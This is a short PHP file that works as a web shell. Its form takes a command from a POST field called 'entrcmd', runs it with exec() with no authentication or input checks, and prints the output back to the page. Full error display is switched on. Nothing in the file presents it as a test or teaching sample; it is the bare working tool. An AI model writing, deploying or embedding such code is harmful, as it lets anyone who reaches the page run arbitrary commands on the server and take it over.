<?php
// phpinfo();
error_reporting(E_ALL);
ini_set('display_errors','On'); 

$a = '';
$res = array();
if(isset($_POST['entrcmd']) && $_POST['entrcmd'] != ''){
	$a = $_POST['entrcmd'];
	exec($a, $res);
}
?>
<form method="post" action="">
	<input type="text" name="entrcmd" value="">
	<input type="submit" name="excmd" value="Run">
</form>
<?php
if(!empty($res)){
	echo '<pre>';
		print_r($res);
	echo '</pre>';
}

?>